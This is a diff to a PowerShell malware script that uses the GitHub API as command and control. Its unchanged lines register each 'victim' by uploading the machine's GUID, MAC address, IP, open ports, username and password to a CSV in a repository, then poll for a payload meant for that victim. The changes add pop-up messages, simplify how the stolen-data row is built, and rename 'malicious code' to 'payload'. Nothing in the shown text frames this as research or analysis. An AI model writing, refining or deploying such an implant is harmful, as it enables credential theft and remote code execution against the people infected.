@@ -60,6 +60,9 @@ $wc.Headers.Add("Authorization", "token $GitHubToken")
 $wc.Headers.Add("User-Agent", $UserAgent)
 $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 
+# === ADD MessageBox ===
+Add-Type -AssemblyName PresentationFramework
+
 # === REGISTER VICTIM IN CSV ===
 try {
     $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
@@ -114,18 +117,7 @@ try {
         }
         $newId = $lastId + 1
 
-        $newRow = -join @(
-            $newId,
-            $Victim_GUID,
-            $mac,
-            $ip,
-            $ports,
-            $user,
-            $pass,
-            "",
-            "",
-            "FALSE"
-        ) -replace " ", ""
+        $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,," + "FALSE"
 
         $allLines = $lines + $newRow
         $finalCsv = ($allLines -join "`n")
@@ -150,13 +142,16 @@ try {
         $upload.GetResponse().Close()
 
         Log-Message "[$(Get-Date)] ✅ New victim registered."
+        [System.Windows.MessageBox]::Show('User is successfully registered.')
     }
     else {
         Log-Message "[$(Get-Date)] Victim already registered."
+        [System.Windows.MessageBox]::Show('User already registered.')
     }
 }
 catch {
     Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
+    [System.Windows.MessageBox]::Show('Registration failed: ' + $_)
 }
 
 # === WAIT BEFORE STARTING POLLING ===
@@ -210,7 +205,7 @@ while ($true) {
         }
 
         if (-not $foundPayload) {
-            Log-Message "[$(Get-Date)] ⚠️ No malicious code found for this GUID."
+            Log-Message "[$(Get-Date)] ⚠️ No payload found for this GUID."
         }
     }
     catch {
